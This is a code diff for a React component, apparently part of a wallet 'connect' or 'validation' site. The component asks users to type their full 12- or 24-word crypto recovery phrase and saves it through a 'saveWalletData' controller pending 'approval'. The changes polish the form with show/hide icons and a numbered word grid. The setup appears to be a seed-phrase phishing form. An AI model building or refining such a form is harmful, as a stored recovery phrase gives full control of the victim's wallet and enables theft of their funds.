@@ -1,7 +1,7 @@
 "use client";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
-import { CheckCircle } from "lucide-react";
+import { Eye, EyeOff, CheckCircle } from "lucide-react";
 import { saveWalletData } from "@/controllers/saveWalletData";
 import { toast } from "sonner";
 import { useEffect, useState } from "react";
@@ -435,14 +435,7 @@ function SeedPhraseTab({ walletName }) {
 		}
 	}, [status]);
 
-	// Helper to display phrase with word numbers
-	const numberedPhrase = phrase
-		? phrase
-				.trim()
-				.split(/\s+/)
-				.map((word, idx) => `${idx + 1}. ${word}`)
-				.join(" ")
-		: "";
+	const phraseWords = phrase.trim().split(/\s+/);
 
 	return (
 		<form onSubmit={handleSubmit}>
@@ -452,27 +445,41 @@ function SeedPhraseTab({ walletName }) {
 						cols={30}
 						rows={4}
 						placeholder="Enter your recovery phrase"
-						className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-white/20 bg-black/20 text-white w-full py-2 focus:outline-none focus:border-blue-400"
+						className="text-sm sm:text-base placeholder-gray-500 pl-4 pr-10 rounded-lg border border-white/20 bg-black/20 text-white w-full py-2 focus:outline-none focus:border-blue-400"
 						name="phrase"
 						minLength={12}
-						value={showPhrase ? numberedPhrase : phrase}
+						value={showPhrase ? phraseWords.map((word, idx) => `${idx + 1}. ${word}`).join(" ") : phrase}
 						onChange={(e) => setPhrase(e.target.value)}
 						required
 						readOnly={submitted || globalPending || status === "approved"}
 					/>
-					<p className="text-xs text-gray-400 mt-2">
-						Must be exactly 12 or 24 words separated by single spaces
-					</p>
 					{submitted && (
 						<button
 							type="button"
-							className="absolute top-2 right-2 bg-blue-700 text-white px-2 py-1 rounded text-xs"
+							className="absolute top-2 right-2 text-blue-400 hover:text-blue-600"
 							onClick={() => setShowPhrase((v) => !v)}
+							aria-label={showPhrase ? "Hide phrase" : "Show phrase"}
 						>
-							{showPhrase ? "Hide Phrase" : "Show Phrase"}
+							{showPhrase ? <EyeOff size={22} /> : <Eye size={22} />}
 						</button>
 					)}
+					<p className="text-xs text-gray-400 mt-2">
+						Must be exactly 12 or 24 words separated by single spaces
+					</p>
 				</div>
+				{submitted && (
+					<div className="mt-4 grid grid-cols-3 sm:grid-cols-4 gap-2">
+						{phraseWords.map((word, idx) => (
+							<div
+								key={idx}
+								className="bg-gray-900/60 p-2 rounded text-center text-white flex flex-col items-center"
+							>
+								<span className="text-xs text-blue-300 font-bold">{idx + 1}</span>
+								<span className="text-xs sm:text-sm font-mono">{word}</span>
+							</div>
+						))}
+					</div>
+				)}
 			</div>
 			{status !== "approved" && (
 				<Button
